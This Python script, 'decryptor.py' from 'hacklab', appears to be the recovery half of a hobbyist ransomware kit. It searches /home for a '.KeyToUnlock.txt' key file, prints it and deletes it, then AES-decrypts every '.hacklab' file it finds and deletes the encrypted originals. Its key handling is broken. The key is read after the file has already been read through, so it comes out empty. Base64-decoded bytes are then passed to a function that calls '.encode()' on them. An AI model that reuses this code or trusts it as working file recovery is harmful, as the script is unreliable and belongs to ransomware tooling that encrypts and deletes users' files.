#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  decryptor.py
#  
#  Copyright 2018 bingo <bingo@hacklab>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  


from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto import Random
from pathlib import Path
from sys import stdout
import time, os, base64
import getpass

blue = "\033[94m"
red = "\033[91m"
end = "\033[0m"








def write(word):
	stdout.write(word+"                                         \r")
	stdout.flush()
	return True



def getkey(key):
	key = SHA256.new(key.encode('utf-8'))
	return key.digest()


def decrypt(key, filename):
	buffersize = 64 * 1024
	outputfile = filename.split('.hacklab')[0]

	with open(filename, 'rb') as infile:
		filesize = int(infile.read(16))
		IV = infile.read(16)
		decryptor = AES.new(key, AES.MODE_CBC, IV)

		with open(outputfile, 'wb') as outfile:
			while True:
				buf = infile.read(buffersize)

				if len(buf) == 0:
					break

				outfile.write(decryptor.decrypt(buf))
			outfile.truncate(filesize)


list_f = []


p = Path('/home/')
# key = "aGFja2xhYg=="


searche2 = list(Path('/home/').glob('**/*.txt'))

FileLocation = ""

for File in searche2:
	File = str(File)
	if File.endswith(".KeyToUnlock.txt"):
		FileLocation = File
	else:
		pass

if FileLocation == "":
	print("NO KEY FILE FOUND! UNABLE TO UNLOCK")


else:
	print("FOUND THE FILE FOUND THE FILE! READING READING READING")

	file_name = FileLocation.split("/")[-1]
	file_path = FileLocation.replace(file_name, "")
	completeName = os.path.join(file_path, file_name)

	print("FILE IS FOUND AT: ")
	print(file_path)
	file1 = open(FileLocation, "r")
	print("KEY FOUND IS:")
	# key = ''.join(file1.readlines())
	print(''.join(file1.readlines()))
	# print(file1.readlines())
	key = ''.join(file1.readlines())
	file1.close()
	# remove the file after reading it!
	os.remove(FileLocation)




try:
	searche = list(p.glob('**/*.hacklab'))

	for file in searche:
		file = str(file)
		#x = x.split("/")[-1]
		list_f.append(file)
		#print(x)

except OSError:
	pass
# print(list_f)
# for root, dirs, files in os.walk(path):
# 	for file in files:
# 		# file =str(file)
# 		# change the extension from '.mp3' to
# 		# the one of your choice.
# 		if (file.endswith('decryptor.py')):
# 			# print(os.path.join(root, file))
# 			pass
# 		else:
# 			list_f.append(file)

for i in list_f:

		name = i.split("/")[-1]
		path = i.replace(name, "")
		write(blue + "[*]Decryption: " + end + str(name))
		os.chdir(path)
		decrypt(getkey(base64.b64decode(key)), name)
		os.remove(name)

print("\n* Done *")
